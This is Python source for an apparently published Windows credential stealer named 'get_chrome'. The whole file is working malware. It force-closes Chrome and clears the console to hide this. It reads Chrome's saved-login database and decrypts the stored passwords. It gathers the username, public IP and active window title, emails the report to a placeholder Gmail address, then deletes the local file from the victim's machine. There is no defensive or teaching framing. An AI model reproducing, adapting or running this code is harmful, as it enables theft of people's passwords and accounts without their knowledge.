## madeby parad0x 20/10/19 8:48pm ##
## WINDOWS ONLY ## // supports all

#imports
import os
import time
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import win32gui
import socket
import requests
import sqlite3
import win32crypt
import platform
import sys

# kills all browser services(this script works only on chrome, as of right now.)
def kill_browsers():
	## kill browsers ##
	browserExe = "chrome.exe"
	os.system("taskkill /f /im "+browserExe)
	os.system("cls")
	# kills chrome // OTHER BROWSERS ARE BLANKED OUT UNTIL WE RELEASE A STABLE RELEASE OF THEM //
	#os.system("taskkill /f /im "+browserExe)
	#os.system("cls")
	# kills microsoft edge
	#os.system("taskkill /f /im MicrosoftEdge.exe")
	#os.system("cls")
	#os.system("taskkill /f /im MicrosoftEdgeCP.exe")
	#os.system("cls")
	#os.system("taskkill /f /im MicrosoftEdgeSH.exe")
	#os.system("cls")
	# kills firefox
	#os.system("taskkill /f /im firefox.exe")
	#os.system("cls")
	# kills opera
	#os.system("taskkill /f /im opera.exe")
	#os.system("cls")
	# kills internet explorer
	#os.system("taskkill /f /im iexplorer.exe")
	#os.system("cls")
	# clears console, making it invisible to user that we killed browser's process
	#os.system("cls")

# gather user info
program_name = 'get_chrome.py'
datetime = time.ctime(time.time())
user = os.path.expanduser('~').split('\\')[2]
publicIP = requests.get('https://api.ipify.org/').text
privateIP = socket.gethostbyname(socket.gethostname())
OS = platform.system()

old_app = ''

welcome = 'Welcome ' + user + ' to ' + program_name + '!'

# sees if the OS is windows, if so - continue. If not - exits.
if (OS == "Windows"):
	print(welcome)
	pass # Continues script
else: # Exits the script with a message
	print(OS + " is incompatible :(\nThis program only supports Windows systems\nparad0x's team will support your OS in future updates!") # Prints the compatable OS for this program.
	time.sleep(10)
	exit()
time.sleep(5)


def get_bytes():
	# directs to Chrome directory
	data_path = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\Login Data'
	c = sqlite3.connect(data_path)
	cursor = c.cursor()
	select_statement = 'SELECT origin_url, username_value, password_value FROM logins'
	# checks to see if database is locked	
	cursor.execute(select_statement) # if you're given "database is locked" (which you wont, because # kill chrome does that for you automatically.
	# fetches all chrome tables from database
	login_data = cursor.fetchall()

	#credential dictionary		
	cred = {}

		# empty string for data
	string = ''

	# displays current window opened as they ran the script
	string += 'Window: ' + win32gui.GetWindowText(win32gui.GetForegroundWindow()) + '\n'
	# writes user data to .txt file
	string += 'Date/Time: ' + datetime + '\nUsername: ' + user + '\nPublic IP: ' + publicIP + '\n'

	# writing passwords to a .txt file
	for url, user_name, pwd in login_data:
	  	pwd = win32crypt.CryptUnprotectData(pwd)
	  	cred[url] = (user_name, pwd[1].decode('utf8'))
	  	string += '\n[+] URL:%s USERNAME:%s PASSWORD:%s\n' % (url,user_name,pwd[1].decode('utf8'))
	  	with open('report.txt', 'w') as fp:
	  		fp.write(string)

# sends .txt as an attachment, to your email
def send_stuff():
	email_from = 'YOUREMAIL@gmail.com'
	password = 'YOURPASSWORD'
	email_to = 'RECEIVERADDRESS@gmail.com'
	subject = 'get_chrome RESULTS'
	msg = MIMEMultipart()
	msg['From'] = email_from
	msg['To'] = email_to
	msg['Subject'] = subject

	body = "Hi there!\nI see you've made it this far with get_chrome.\nPlease follow the instructions below.\n• Our latest update has allowed us to send the proper text format file.\n• Open the .txt file to retrieve victim data.\nThanks for using get_chrome\n[!] Please star our project: https://github.com/parad0xxxx/get_chrome\n[!] Follow me on GitHub: https://github.com/parad0xxxx\nCreator: ~ parad0x & snavellet"
	msg.attach(MIMEText(body,'plain'))

	filename='report.txt'
	attachment =open(filename,'rb')

	part = MIMEBase('application', 'octet-stream')
	part.set_payload((attachment).read())
	encoders.encode_base64(part)
	part.add_header('Content-Disposition',"attachment; filename= " + filename)

	msg.attach(part)
	text = msg.as_string()
	server = smtplib.SMTP('smtp.gmail.com',587)
	server.starttls()
	server.login(email_from,password)

	server.sendmail(email_from,email_to,text)

# runs every event
if __name__ == '__main__':
	kill_browsers()
	get_bytes()
	send_stuff()
	# removes .txt file from victims computer
	os.remove('report.txt')
	print("You may now close the program")
	time.sleep(60)
